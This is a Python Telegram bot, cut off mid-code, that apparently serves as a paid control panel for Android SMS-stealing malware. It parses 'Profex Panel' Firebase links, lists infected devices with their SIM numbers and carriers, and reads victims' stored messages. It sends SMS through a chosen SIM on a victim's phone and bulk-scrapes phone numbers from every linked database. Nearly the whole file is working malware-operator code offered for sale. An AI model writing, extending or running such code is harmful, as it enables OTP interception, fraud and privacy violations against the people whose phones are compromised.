#!/usr/bin/env python3
"""
TG SMS Sender V2 - Telegram Bot & Vercel-to-Profex Forwarding Engine
=====================================================================
Features:
- /start : Interactive Control Panel
- /setfirebase <link> : Parse Profex Panel URL / Firebase credentials
- /fy or /setdevice : Online device list & full Firebase metadata card
- Interactive Inline Keyboard for [ SIM 1 ] & [ SIM 2 ] selection
- /key <vercel_key> : Set Vercel Feed License Key
- /addchannel <id> : Set Telegram Channel for SMS Feed
- /startmonitor : Enable Vercel reading & Firebase PUT forwarding
- /stopmonitor : Pause SMS reading & forwarding
- /status : Full Live Dashboard
"""

from __future__ import annotations

import asyncio
import base64
import json
import logging
import os
import re
import sys
import time
import math
from datetime import datetime, timezone
import html
from pathlib import Path
from typing import Any
from urllib import parse

import aiohttp
from dotenv import load_dotenv

from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command, CommandObject, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Message,
    FSInputFile,
    BotCommand,
    TelegramObject,
)
from aiogram import BaseMiddleware
from typing import Callable, Dict, Awaitable

try:
    import psutil
except ImportError:
    psutil = None

# -------------------------------------------------------------------
# Environment & Logger Setup
# -------------------------------------------------------------------
ENV_PATH = Path(__file__).parent / ".env"
load_dotenv(dotenv_path=ENV_PATH)

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "").strip()
DEFAULT_CHANNEL_ID = os.getenv("DEFAULT_CHANNEL_ID", "-1003942459677").strip()

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
logger = logging.getLogger("TGSmsSenderV2")

router = Router()
SESSIONS_DIR = Path(__file__).parent / "sessions"
SESSIONS_DIR.mkdir(parents=True, exist_ok=True)
HTTP_SESSION: aiohttp.ClientSession | None = None

OWNER_IDS = [1723095171, 8877219160]

# -------------------------------------------------------------------
# FSM States for Interactive Input
# -------------------------------------------------------------------
class BotSetupStates(StatesGroup):
    waiting_for_firebase = State()
    waiting_for_license_key = State()
    waiting_for_channel_id = State()
    waiting_for_import_file = State()

# -------------------------------------------------------------------
# Helper for Web Dashboard Logging
# -------------------------------------------------------------------
def log_to_dashboard(user_id: str, action: str, details: dict):
    try:
        log_entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "user_id": user_id,
            "action": action,
            "details": details
        }
        with open("dashboard_logs.jsonl", "a", encoding="utf-8") as f:
            f.write(json.dumps(log_entry) + "\n")
    except Exception:
        pass

# -------------------------------------------------------------------
# User Authorization
# -------------------------------------------------------------------
def load_approved_users() -> set[int]:
    path = SESSIONS_DIR / "approved_users.json"
    if path.exists():
        try:
            raw = json.loads(path.read_text(encoding="utf-8"))
            return {int(x) for x in raw if str(x).lstrip('-').isdigit()}
        except Exception as e:
            logger.error(f"Error reading approved_users.json: {e}")
    return set()

def save_approved_users(users: set[int]) -> None:
    path = SESSIONS_DIR / "approved_users.json"
    cleaned = sorted({int(x) for x in users if str(x).lstrip('-').isdigit()})
    path.write_text(json.dumps(cleaned, indent=2), encoding="utf-8")

class AuthMiddleware(BaseMiddleware):
    async def __call__(
        self,
        handler: Callable[[TelegramObject, Dict[str, Any]], Awaitable[Any]],
        event: TelegramObject,
        data: Dict[str, Any]
    ) -> Any:
        user = data.get("event_from_user")
        if user:
            user_id = user.id
            approved = load_approved_users()
            is_owner = (user_id in OWNER_IDS) or (str(user_id) in [str(o) for o in OWNER_IDS])
            is_approved = (user_id in approved) or (str(user_id) in [str(u) for u in approved])
            if not is_owner and not is_approved:
                if isinstance(event, Message):
                    kb = InlineKeyboardMarkup(
                        inline_keyboard=[
                            [InlineKeyboardButton(text="Contact Owner", url="tg://user?id=8206800557")]
                        ]
                    )
                    await event.answer(
                        "❌ <b>You are not authorized to use this bot.</b>\n\n<b>BUY SUBSCRIPTION AT JUST 60$</b>",
                        reply_markup=kb,
                        parse_mode=ParseMode.HTML
                    )
                elif isinstance(event, CallbackQuery):
                    await event.answer("❌ Not authorized.", show_alert=True)
                return
        return await handler(event, data)

router.message.middleware(AuthMiddleware())
router.callback_query.middleware(AuthMiddleware())

# -------------------------------------------------------------------
# Config Storage Helpers
# -------------------------------------------------------------------
USER_CONFIG_CACHE: dict[str, dict[str, Any]] = {}
CHANNEL_TO_USER_MAP: dict[str, str] = {}

def get_user_session_path(user_id: int | str) -> Path:
    return SESSIONS_DIR / f"user_{user_id}.json"

def load_user_config(user_id: int | str) -> dict[str, Any]:
    u_key = str(user_id)
    if u_key in USER_CONFIG_CACHE:
        return USER_CONFIG_CACHE[u_key]

    path = get_user_session_path(user_id)
    default_config: dict[str, Any] = {
        "user_id": u_key,
        "license_key": "",
        "firebase_url": "",
        "auth_key": "",
        "selected_device_id": "",
        "selected_sim_slot": 1,
        "channel_id": "",
        "is_polling_active": False,
        "last_timestamp": 0,
        "last_updated": datetime.now(timezone.utc).isoformat(),
        "stats_tokens_sent": 0,
        "stats_real_sms": 0,
        "stats_spoof_injects": 0,
        "ignore_initial_messages": True,
        "saved_firebases": []
    }
    if path.exists():
        try:
            stored = json.loads(path.read_text(encoding="utf-8"))
            if isinstance(stored, dict):
                default_config.update(stored)
        except Exception as e:
            logger.error(f"Error loading user config for {user_id}: {e}")

    USER_CONFIG_CACHE[u_key] = default_config
    ch = str(default_config.get("channel_id") or "")
    if ch:
        CHANNEL_TO_USER_MAP[ch] = u_key
    return default_config

def save_user_config(user_id: int | str, config: dict[str, Any]) -> None:
    u_key = str(user_id)
    USER_CONFIG_CACHE[u_key] = config
    ch = str(config.get("channel_id") or "")
    if ch:
        CHANNEL_TO_USER_MAP[ch] = u_key

    path = get_user_session_path(user_id)
    config["last_updated"] = datetime.now(timezone.utc).isoformat()
    try:
        path.write_text(json.dumps(config, indent=2, ensure_ascii=False), encoding="utf-8")
    except Exception as e:
        logger.error(f"Error saving user config for {user_id}: {e}")

GLOBAL_FB_PATH = SESSIONS_DIR / "global_firebases.json"

# -------------------------------------------------------------------
# Profex Link Parser & Firebase Sanitizer
# -------------------------------------------------------------------
def clean_firebase_entry(url: str, auth: str) -> tuple[str, str] | None:
    if not url:
        return None
    m_url = re.search(r'https?://[a-zA-Z0-9_\-\.]+\.(?:firebaseio\.com|firebasedatabase\.app)', str(url))
    if not m_url:
        return None
    clean_u = m_url.group(0).rstrip("/")
    
    clean_a = clean_u
    if auth:
        auth_str = str(auth).strip()
        m_auth = re.search(r'https?://[a-zA-Z0-9_\-\.]+\.(?:firebaseio\.com|firebasedatabase\.app)', auth_str)
        if m_auth:
            clean_a = m_auth.group(0).rstrip("/")
        else:
            m_tok = re.search(r'^[a-zA-Z0-9_\-]+$', auth_str)
            if m_tok:
                clean_a = m_tok.group(0)
    return clean_u, clean_a

def get_global_firebases() -> list[dict[str, str]]:
    if GLOBAL_FB_PATH.exists():
        try:
            raw_list = json.loads(GLOBAL_FB_PATH.read_text(encoding="utf-8"))
            if isinstance(raw_list, list):
                cleaned_list = []
                seen_set = set()
                for item in raw_list:
                    if isinstance(item, dict):
                        cu, ca = clean_firebase_entry(item.get("url", ""), item.get("auth", "")) or (None, None)
                        if cu and (cu, ca) not in seen_set:
                            seen_set.add((cu, ca))
                            cleaned_list.append({"url": cu, "auth": ca})
                return cleaned_list
        except Exception:
            pass
            
    fb_set = set()
    firebases = []
    for f in SESSIONS_DIR.glob("user_*.json"):
        try:
            cfg = json.loads(f.read_text(encoding="utf-8"))
            for fb in cfg.get("saved_firebases", []):
                cleaned = clean_firebase_entry(fb.get("url", ""), fb.get("auth", ""))
                if cleaned:
                    cu, ca = cleaned
                    key = f"{cu}|||{ca}"
                    if key not in fb_set:
                        fb_set.add(key)
                        firebases.append({"url": cu, "auth": ca})
        except Exception:
            pass
            
    try:
        GLOBAL_FB_PATH.write_text(json.dumps(firebases, indent=2), encoding="utf-8")
    except Exception:
        pass
        
    return firebases

def add_global_firebase(url: str, auth: str) -> None:
    cleaned = clean_firebase_entry(url, auth)
    if not cleaned:
        return
    cu, ca = cleaned
    fbs = get_global_firebases()
    for fb in fbs:
        if fb.get("url", "").rstrip("/") == cu and fb.get("auth", "") == ca:
            return
            
    fbs.append({"url": cu, "auth": ca})
    try:
        GLOBAL_FB_PATH.write_text(json.dumps(fbs, indent=2), encoding="utf-8")
    except Exception:
        pass

def parse_profex_link(link: str) -> tuple[str, str] | None:
    link = link.strip()
    if not link:
        return None
    try:
        if "profexpanel.netlify.app" in link or "?s=" in link:
            parsed_url = parse.urlparse(link)
            query_params = parse.parse_qs(parsed_url.query)
            if "s" in query_params and query_params["s"]:
                s_val = query_params["s"][0]
                try:
                    padded = s_val + "=" * (-len(s_val) % 4)
                    decoded = base64.b64decode(padded).decode("utf-8")
                    if "|||" in decoded:
                        parts = decoded.split("|||")
                        res = clean_firebase_entry(parts[0], parts[1])
                        if res:
                            return res
                except Exception:
                    pass
        if "|||" in link:
            parts = link.split("|||")
            res = clean_firebase_entry(parts[0], parts[1])
            if res:
                return res
        if link.startswith("http://") or link.startswith("https://"):
            res = clean_firebase_entry(link, link)
            if res:
                return res
    except Exception as e:
        logger.error(f"Profex link parse error: {e}")
    return None

# -------------------------------------------------------------------
# Firebase Device Helpers
# -------------------------------------------------------------------
async def fetch_firebase_devices(firebase_url: str, auth_key: str) -> list[str]:
    cleaned = clean_firebase_entry(firebase_url, auth_key)
    if not cleaned:
        return []
    clean_base, clean_auth = cleaned
    query = parse.urlencode({"auth": clean_auth, "shallow": "true"})
    
    url_clients = f"{clean_base}/clients.json?{query}"
    try:
        assert HTTP_SESSION is not None
        async with HTTP_SESSION.get(url_clients, timeout=6) as resp:
            if resp.status == 200:
                data = await resp.json()
                if isinstance(data, dict) and data:
                    return [str(k) for k in data.keys() if str(k) != "{DEVICE_ID_MY_PROJECT}"]
    except Exception as e:
        logger.debug(f"Error fetching clients from {clean_base}: {e}")
        
    url_devices = f"{clean_base}/devices.json?{query}"
    try:
        assert HTTP_SESSION is not None
        async with HTTP_SESSION.get(url_devices, timeout=6) as resp:
            if resp.status == 200:
                data = await resp.json()
                if isinstance(data, dict) and data:
                    return [str(k) for k in data.keys() if str(k) != "{DEVICE_ID_MY_PROJECT}"]
    except Exception as e:
        logger.debug(f"Error fetching devices from {clean_base}: {e}")

    return []

async def fetch_device_details(firebase_url: str, auth_key: str, device_id: str) -> dict[str, Any]:
    if not device_id:
        return {}
    cleaned = clean_firebase_entry(firebase_url, auth_key)
    if not cleaned:
        return {}
    clean_base, clean_auth = cleaned
    clean_dev = parse.quote(device_id.strip())
    query = parse.urlencode({"auth": clean_auth})
    
    url_clients = f"{clean_base}/clients/{clean_dev}.json?{query}"
    try:
        assert HTTP_SESSION is not None
        async with HTTP_SESSION.get(url_clients, timeout=6) as resp:
            if resp.status == 200:
                data = await resp.json()
                if isinstance(data, dict) and data:
                    return data
    except Exception as e:
        logger.debug(f"Error fetching details from clients for {device_id} on {clean_base}: {e}")
        
    url_devices = f"{clean_base}/devices/{clean_dev}.json?{query}"
    try:
        assert HTTP_SESSION is not None
        async with HTTP_SESSION.get(url_devices, timeout=6) as resp:
            if resp.status == 200:
                data = await resp.json()
                if isinstance(data, dict) and data:
                    return data
    except Exception as e:
        logger.debug(f"Error fetching details from devices for {device_id} on {clean_base}: {e}")
        
    return {}

# -------------------------------------------------------------------
# Smart SIM & Carrier Resolution
# -------------------------------------------------------------------
def normalize_carrier(c: str) -> str:
    if not c:
        return ""
    c_low = c.lower().strip()
    if "jio" in c_low:
        return "Jio"
    if "airtel" in c_low:
        return "Airtel"
    if "voda" in c_low or "idea" in c_low or c_low == "vi" or "vi " in c_low:
        return "Vi"
    if "bsnl" in c_low:
        return "BSNL"
    return c.strip().title()

def is_same_phone(p1: str, p2: str) -> bool:
    d1 = re.sub(r"\D", "", str(p1 or ""))
    d2 = re.sub(r"\D", "", str(p2 or ""))
    if not d1 or not d2:
        return False
    return d1[-10:] == d2[-10:]

def parse_phone_and_carrier(raw_val: Any) -> tuple[str, str]:
    if not raw_val:
        return "", ""
    s = str(raw_val).strip()
    if s.lower() in ("unknown", "none", "null", "no num", "no number", "no sim", "no service", ""):
        return "", ""
        
    carrier = ""
    phone = s
    
    m = re.match(r"^([A-Za-z\s]+?)\s*([+]?[0-9]{8,15})$", s)
    if m:
        c_cand = m.group(1).strip()
        p_cand = m.group(2).strip()
        if c_cand.lower() not in ("unknown", "none", "null", "no service"):
            carrier = normalize_carrier(c_cand)
        phone = p_cand
    elif re.match(r"^[+]?[0-9]{8,15}$", s):
        phone = s
    else:
        num_match = re.search(r"[+]?[0-9]{10,13}", s)
        if num_match:
            phone = num_match.group(0)
            prefix = s[:num_match.start()].strip()
            if prefix and prefix.lower() not in ("unknown", "none", "null", "no service"):
                carrier = normalize_carrier(prefix)
        else:
            carrier = normalize_carrier(s)
            phone = ""
            
    return carrier, phone

def get_device_sim_display(details: dict[str, Any], active_sim_idx: int = 1) -> tuple[str, str, str]:
    known_phones: list[str] = []
    known_carriers: list[str] = []
    
    def add_phone(p: str):
        if not p:
            return
        for ep in known_phones:
            if is_same_phone(ep, p):
                return
        known_phones.append(p)

    def add_carrier(c: str):
        if not c or c.lower() in ("unknown", "none", "null", "no service"):
            return
        nc = normalize_carrier(c)
        if nc and nc not in known_carriers:
            known_carriers.append(nc)

    nested_sources = [
        details,
        details.get("sendSms") if isinstance(details.get("sendSms"), dict) else {},
        details.get("action") if isinstance(details.get("action"), dict) else {}
    ]

    for source in nested_sources:
        for k in ["mobNo", "phoneNumber", "phone", "number", "mobileNumber", "phone1", "sim1", "phone2", "sim2"]:
            val = source.get(k)
            c, p = parse_phone_and_carrier(val)
            if p:
                add_phone(p)
            if c:
                add_carrier(c)
            
    root_provider = str(details.get("service_provider") or details.get("carrier") or "").strip()
    if root_provider:
        add_carrier(root_provider)
            
    analysis = details.get("smsAnalysis")
    if isinstance(analysis, dict):
        for p in analysis.get("phoneNumbers", []):
            _, clean_p = parse_phone_and_carrier(p)
            if clean_p:
                add_phone(clean_p)
        for n in analysis.get("networks", []):
            add_carrier(str(n))

    sims_data = {0: {"carrier": "", "phone": "", "found": False}, 1: {"carrier": "", "phone": "", "found": False}}
    raw_sims = details.get("sims")
    if isinstance(raw_sims, list):
        for s in raw_sims:
            if not isinstance(s, dict):
                continue
            idx_str = str(s.get("simSlotIndex", s.get("slot", s.get("simSlot", ""))))
            c_raw = s.get("carrierName", s.get("carrier", ""))
            p_raw = s.get("phoneNumber", s.get("number", s.get("phone", "")))
            
            c_sim, p_sim = parse_phone_and_carrier(f"{c_raw} {p_raw}".strip())
            slot = 0 if idx_str == "0" else (1 if idx_str == "1" else None)
            if slot is not None:
                sims_data[slot]["found"] = True
                if c_sim:
                    sims_data[slot]["carrier"] = c_sim
                    add_carrier(c_sim)
                if p_sim:
                    sims_data[slot]["phone"] = p_sim
                    add_phone(p_sim)

    sim1_carrier = sims_data[0]["carrier"] or (known_carriers[0] if known_carriers else "")
    sim1_phone = sims_data[0]["phone"] or (known_phones[0] if known_phones else "")
    sim1_installed = sims_data[0]["found"] or bool(sim1_phone) or bool(sim1_carrier) or (active_sim_idx == 1)

    remaining_phones = [p for p in known_phones if not is_same_phone(p, sim1_phone)]
    remaining_carriers = [c for c in known_carriers if normalize_carrier(c) != normalize_carrier(sim1_carrier)]
    
    sim2_carrier = sims_data[1]["carrier"] or (remaining_carriers[0] if remaining_carriers else "")
    sim2_phone = sims_data[1]["phone"] or (remaining_phones[0] if remaining_phones else "")
    
    sim2_has_data = sims_data[1]["found"] or bool(sim2_phone) or bool(sim2_carrier)
    root_sim_slot = str(details.get("simSlot", details.get("sendSms", {}).get("simSlot", "")))
    if root_sim_slot == "1" or str(details.get("sendSms", {}).get("sim", "")) == "2":
        sim2_has_data = True
        
    sim2_installed = sim2_has_data or (active_sim_idx == 2)

    def format_sim(carrier: str, phone: str) -> str:
        if carrier and phone:
            return f"{carrier} ({phone})"
        elif phone:
            return f"{phone}"
        elif carrier:
            return f"{carrier} (ACTIVE)"
        else:
            return "ACTIVE SIM"

    sim1_desc = format_sim(sim1_carrier, sim1_phone).upper()
    sim1_text = f"[+] SIM 1   : {sim1_desc}"

    display_c = sim2_carrier or (sim1_carrier if active_sim_idx == 2 else "")
    display_p = sim2_phone or (sim1_phone if active_sim_idx == 2 else "")
    sim2_desc = format_sim(display_c, display_p).upper()
    sim2_text = f"[+] SIM 2   : {sim2_desc}"

    if active_sim_idx == 2:
        from_num = sim2_phone or sim1_phone or (known_phones[0] if known_phones else "UNKNOWN")
    else:
        from_num = sim1_phone or (known_phones[0] if known_phones else "UNKNOWN")

    return sim1_text, sim2_text, from_num, sim1_phone, sim2_phone

def is_device_online(details: dict[str, Any]) -> bool:
    if not isinstance(details, dict):
        return False
    st = details.get("status")
    if st is True:
        return True
    if isinstance(st, str) and st.strip().lower() in ("true", "online", "active", "1", "connected"):
        return True
    if isinstance(st, (int, float)) and st == 1:
        return True
    for k in ("online", "isOnline", "connected", "state"):
        val = details.get(k)
        if val is True:
            return True
        if isinstance(val, str) and val.strip().lower() in ("true", "online", "active", "1", "connected"):
            return True
        if isinstance(val, (int, float)) and val == 1:
            return True
    return False

def render_device_connected_card(details: dict[str, Any], active_sim_idx: int) -> str:
    model_name = str(details.get("modelName") or details.get("like") or "UNKNOWN DEVICE").strip().upper()
    battery = str(details.get("battery") or "0").strip().rstrip("%")
    sim1_text, sim2_text, from_num, _, _ = get_device_sim_display(details, active_sim_idx)
    dev_status = "ONLINE" if is_device_online(details) else "OFFLINE"

    card_text = (
        "<pre><code>"
        "╔════════════════════════════════════╗\n"
        "║      DEVICE CONNECTED SUCCESS      ║\n"
        "╚════════════════════════════════════╝\n"
        f"[+] STATUS  : {dev_status}\n"
        f"[+] MODEL   : {model_name}\n"
        f"[+] BATTERY : {battery}%\n"
        f"[+] ACTIVE  : SIM {active_sim_idx}\n"
        f"[+] NUMBER  : {from_num.upper()}\n"
        "──────────────────────────────────────\n"
        f"{sim1_text}\n"
        f"{sim2_text}\n"
        "══════════════════════════════════════\n"
        "Select SIM slot below for SMS:\n"
        "</code></pre>"
    )
    return card_text

# -------------------------------------------------------------------
# Real-Time SMS Dispatch via Firebase (IRL Latency Tracking)
# -------------------------------------------------------------------
async def send_sms_via_firebase(config: dict[str, Any], to_number: str, message_text: str) -> tuple[dict[str, Any], float]:
    firebase_url = config.get("firebase_url", "").rstrip("/")
    auth_key = config.get("auth_key", "")
    device_id = config.get("selected_device_id", "").strip()
    sim_slot = int(config.get("selected_sim_slot") or 1)

    if not firebase_url or not auth_key or not device_id:
        raise RuntimeError("Missing Firebase URL, Auth Key, or Target Device ID")

    clean_dev = parse.quote(device_id)
    query = parse.urlencode({"auth": auth_key})
    url = f"{firebase_url}/clients/{clean_dev}/webhookEvent/sendSms.json?{query}"

    payload = {
        "from": sim_slot - 1,
        "to": to_number.strip(),
        "message": message_text.strip(),
        "isSended": False,
        "createdAt": datetime.now(timezone.utc).isoformat(),
    }

    assert HTTP_SESSION is not None
    payload_bytes = json.dumps(payload, ensure_ascii=False).encode("utf-8")
    t0 = time.perf_counter()
    async with HTTP_SESSION.put(url, data=payload_bytes, headers={"Content-Type": "application/json"}, timeout=aiohttp.ClientTimeout(total=2.0, connect=0.8)) as resp:
        dispatch_ms = round((time.perf_counter() - t0) * 1000, 1)
        if resp.status >= 400:
            err_body = await resp.text()
            raise RuntimeError(f"Firebase PUT failed status {resp.status}: {err_body[:100]}")
        return {"status": "ok"}, dispatch_ms

# -------------------------------------------------------------------
# Number Finder / Scraper Engine (OG CLOUDY Style)
# -------------------------------------------------------------------
def extract_phone_numbers_from_string(text: str) -> list[str]:
    if not text:
        return []
    s = str(text).strip()
    found = []
    matches = re.findall(r'(?:\+?91[\s\-]?)?([6789]\d{9})\b', s)
    for m in matches:
        num = "+91" + m
        if num not in found:
            found.append(num)
    return found

def clean_and_format_number(raw_val: Any) -> str | None:
    if not raw_val or str(raw_val).strip().lower() in ("unknown", "none", "null", "no num", "no number", "no sim", "no service", "", ""):
        return None
    nums = extract_phone_numbers_from_string(str(raw_val))
    return nums[0] if nums else None

async def fetch_device_messages(firebase_url: str, auth_key: str, device_id: str) -> dict[str, Any]:
    if not firebase_url or not auth_key or not device_id:
        return {}
    clean_base = firebase_url.rstrip("/")
    clean_dev = parse.quote(device_id.strip())
    query = parse.urlencode({"auth": auth_key, "limitToLast": "100"})
    url = f"{clean_base}/messages/{clean_dev}.json?{query}"
    try:
        assert HTTP_SESSION is not None
        async with HTTP_SESSION.get(url, timeout=8) as resp:
            if resp.status == 200:
                data = await resp.json()
                if isinstance(data, dict):
                    return data
    except Exception as e:
        logger.error(f"Error fetching messages for {device_id}: {e}")
    return {}

def extract_device_numbers_data(dev_id: str, details: dict[str, Any], messages: dict[str, Any] | None = None) -> dict[str, Any]:
    model = str(details.get("modelName") or details.get("like") or "UNKNOWN").upper()
    is_online = is_device_online(details)
    status_str = "ONLINE" if is_online else "OFFLINE"
    
    sim_numbers = []
    sms_numbers = []
    carriers = set()

    def add_sim_num(n: str):
        if n and n not in sim_numbers:
            sim_numbers.append(n)

    def add_sms_num(n: str):
        if n and n not in sms_numbers:
            sms_numbers.append(n)

    # 1. Check direct phone fields (top-level and nested)
    nested_sources = [
        details,
        details.get("sendSms") if isinstance(details.get("sendSms"), dict) else {},
        details.get("action") if isinstance(details.get("action"), dict) else {}
    ]

    for source in nested_sources:
        for k in ["mobNo", "phoneNumber", "phone", "number", "mobileNumber", "phone1", "sim1", "phone2", "sim2"]:
            val = source.get(k)
            num = clean_and_format_number(val)
            if num:
                add_sim_num(num)
            c, _ = parse_phone_and_carrier(val)
            if c:
                carriers.add(c)

    # 2. Check sims list
    raw_sims = details.get("sims")
    if isinstance(raw_sims, list):
        for s in raw_sims:
            if isinstance(s, dict):
                p_raw = s.get("phoneNumber") or s.get("number") or s.get("phone")
                num = clean_and_format_number(p_raw)
                if num:
                    add_sim_num(num)
                c_raw = s.get("carrierName") or s.get("carrier")
                if c_raw:
                    c = normalize_carrier(str(c_raw))
                    if c:
                        carriers.add(c)

    # 3. Check smsAnalysis object
    sms_analysis = details.get("smsAnalysis")
    if isinstance(sms_analysis, dict):
        p_list = sms_analysis.get("phoneNumbers") or []
        for p in p_list:
            num = clean_and_format_number(p)
            if num:
                add_sms_num(num)
        n_list = sms_analysis.get("networks") or []
        for n in n_list:
            c = normalize_carrier(str(n))
            if c:
                carriers.add(c)

    # 4. Check raw messages if provided
    if isinstance(messages, dict):
        for k, msg_obj in messages.items():
            if isinstance(msg_obj, dict):
                sender = msg_obj.get("sender") or msg_obj.get("from") or ""
                num_s = clean_and_format_number(sender)
                if num_s:
                    add_sms_num(num_s)
                body = msg_obj.get("message") or msg_obj.get("body") or msg_obj.get("text") or ""
                if body:
                    found_in_body = extract_phone_numbers_from_string(str(body))
                    for num in found_in_body:
                        add_sms_num(num)

    all_nums = list(dict.fromkeys(sim_numbers + sms_numbers))
    return {
        "device_id": dev_id,
        "model": model,
        "status": status_str,
        "is_online": is_online,
        "sim_numbers": sim_numbers,
        "sms_numbers": sms_numbers,
        "all_unique_numbers": all_nums,
        "carriers": list(carriers)
    }

async def run_number_search(user_id: int, target_dev_id: str | None = None, filter_type: str = "all") -> tuple[str, list[str]]:
    saved_fbs = get_global_firebases()
    if not saved_fbs:
        return "<pre><code>[!] ERROR: NO DATABASES SAVED.\n[+] LINK FIREBASE FIRST: /setfirebase &lt;URL&gt;</code></pre>", []

    all_unique_numbers = set()
    output_text = ""

    if target_dev_id:
        target_dev_id = target_dev_id.strip()
        found_fb = None
        details = {}
        msgs = {}
        
        async def check_db(fb):
            fb_url = fb.get("url", "")
            fb_auth = fb.get("auth", "")
            d = await fetch_device_details(fb_url, fb_auth, target_dev_id)
            if d and (d.get("modelName") or d.get("like") or d.get("battery") or d.get("mobNo") or d.get("phoneNumber")):
                m = await fetch_device_messages(fb_url, fb_auth, target_dev_id)
                return fb, d, m
            return None

        tasks = [check_db(fb) for fb in saved_fbs]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for res in results:
            if isinstance(res, tuple) and res[0] is not None:
                found_fb, details, msgs = res
                break
                
        if not found_fb:
            return f"<pre><code>[!] ERROR: DEVICE {html.escape(target_dev_id)} NOT FOUND IN ANY DB.</code></pre>", []

        dev_data = extract_device_numbers_data(target_dev_id, details, msgs)
        for n in dev_data["all_unique_numbers"]:
            all_unique_numbers.add(n)

        sim_str = "\n".join([f" ├─ SIM  : {n}" for n in dev_data["sim_numbers"]]) if dev_data["sim_numbers"] else " ├─ SIM  : NO SIM NUMBERS"
        sms_str = "\n".join([f" ├─ SMS  : {n}" for n in dev_data["sms_numbers"]]) if dev_data["sms_numbers"] else " ├─ SMS  : NO SMS NUMBERS"

        output_text = (
            "<pre><code>"
            "╔════════════════════════════════════╗\n"
            "║       DEVICE NUMBERS SCRAPED       ║\n"
            "╚════════════════════════════════════╝\n"
            f"[+] DEVICE  : {dev_data['device_id']}\n"
            f"[+] MODEL   : {dev_data['model']}\n"
            f"[+] STATUS  : {dev_data['status']}\n"
            f"[+] FOUND   : {len(dev_data['all_unique_numbers'])} NUMBERS\n"
            "──────────────────────────────────────\n"
            f"{sim_str}\n"
            f"{sms_str}\n"
            "══════════════════════════════════════\n"
            "</code></pre>"
        )
    else:
        scanned_devices = []
        
        async def scan_single_db(fb):
            fb_url = fb.get("url", "")
            fb_auth = fb.get("auth", "")
            devices_list = await fetch_firebase_devices(fb_url, fb_auth)
            db_devs = []
            for dev_id in devices_list:
                d = await fetch_device_details(fb_url, fb_auth, dev_id)
                m = await fetch_device_messages(fb_url, fb_auth, dev_id)
                dev_data = extract_device_numbers_data(dev_id, d, m)
                db_devs.append(dev_data)
            return db_devs

        tasks = [scan_single_db(fb) for fb in saved_fbs]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for res in results:
            if isinstance(res, list):
                for dev_data in res:
                    scanned_devices.append(dev_data)

        if not scanned_devices:
            return "<pre><code>[!] ERROR: NO CONNECTED DEVICES FOUND IN DATABASES.</code></pre>", []

        if filter_type == "online":
            scanned_devices = [d for d in scanned_devices if d["is_online"]]
        elif filter_type == "offline":
            scanned_devices = [d for d in scanned_devices if not d["is_online"]]

        for d in scanned_devices:
            nums_to_count = d["sms_numbers"] if filter_type == "sms" else d["all_unique_numbers"]
            for n in nums_to_count:
                all_unique_numbers.add(n)

        total_online = sum(1 for d in scanned_devices if d["is_online"])
        total_offline = sum(1 for d in scanned_devices if not d["is_online"])

        output_text = (
            "<pre><code>"
            "╔════════════════════════════════════╗\n"
            "║        GLOBAL NUMBER FINDER        ║\n"
            "╚════════════════════════════════════╝\n"
            f"[+] DEVS SCANNED: {len(scanned_devices)} ({total_online} ON | {total_offline} OFF)\n"
            f"[+] TOTAL UNIQUE : {len(all_unique_numbers)} NUMBERS\n"
            "──────────────────────────────────────\n"
        )

        dev_entries = []
        for d in scanned_devices[:20]:
            target_nums = d["sms_numbers"] if filter_type == "sms" else d["all_unique_numbers"]
            if not target_nums:
                continue
            entry = f"[*] {d['model']} ({d['status']})\n ├─ ID: {d['device_id']}\n"
            for n in target_nums[:5]:
                entry += f" ├─ {n}\n"
            dev_entries.append(entry.rstrip())

        if dev_entries:
            output_text += "\n".join(dev_entries) + "\n"
        else:
            output_text += "[!] NO MATCHING NUMBERS FOUND ON DEVICES.\n"

        output_text += "══════════════════════════════════════\n</code></pre>"

    return output_text, sorted(list(all_unique_numbers))

async def send_number_search_result(message: Message, text: str, numbers: list[str], title_tag: str = "scraped_numbers"):
    if numbers:
        filename = f"{title_tag}_{int(time.time())}.txt"
        file_path = SESSIONS_DIR / filename
        file_path.write_text("\n".join(numbers), encoding="utf-8")
        caption = f"📄 <b>Extracted {len(numbers)} unique number(s).</b>"
        try:
            await message.answer_document(FSInputFile(str(file_path)), caption=text, parse_mode=ParseMode.HTML)
        finally:
            file_path.unlink(missing_ok=True)
    else:
        await message.answer(text, parse_mode=ParseMode.HTML)

# -------------------------------------------------------------------
# Keyboards & Navigation
# -------------------------------------------------------------------
def get_main_menu_keyboard(config: dict[str, Any]) -> InlineKeyboardMarkup:
    monitoring_btn = (
        InlineKeyboardButton(text="🔴 STOP", callback_data="cmd_stopmon")
        if config.get("is_polling_active")
        else InlineKeyboardButton(text="🟢 START", callback_data="cmd_startmon")
    )
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🔗 Link Firebase", callback_data="cmd_link_fb"),
                InlineKeyboardButton(text="📱 Set Device", callback_data="cmd_search_id"),
            ],
            [
                InlineKeyboardButton(text="🔑 Set Key", callback_data="cmd_set_key"),
                InlineKeyboardButton(text="📢 Add Channel", callback_data="cmd_set_channel"),
            ],
            [
                InlineKeyboardButton(text="🔍 Find Numbers", callback_data="cmd_find_all_nums"),
            ],
            [monitoring_btn],
            [InlineKeyboardButton(text="📊 View Status Dashboard", callback_data="cmd_status")],
        ]
    )

def get_sim_selection_keyboard(device_id: str, current_slot: int, details: dict[str, Any] = {}) -> InlineKeyboardMarkup:
    sim1_check = "✅ " if current_slot == 1 else "📶 "
    sim2_check = "✅ " if current_slot == 2 else "📶 "

    sim_rows = [
        [
            InlineKeyboardButton(text=f"{sim1_check}SIM 1", callback_data=f"set_sim_1_{device_id}"),
            InlineKeyboardButton(text=f"{sim2_check}SIM 2", callback_data=f"set_sim_2_{device_id}"),
        ],
        [
            InlineKeyboardButton(text="🟢 START", callback_data="cmd_startmon"),
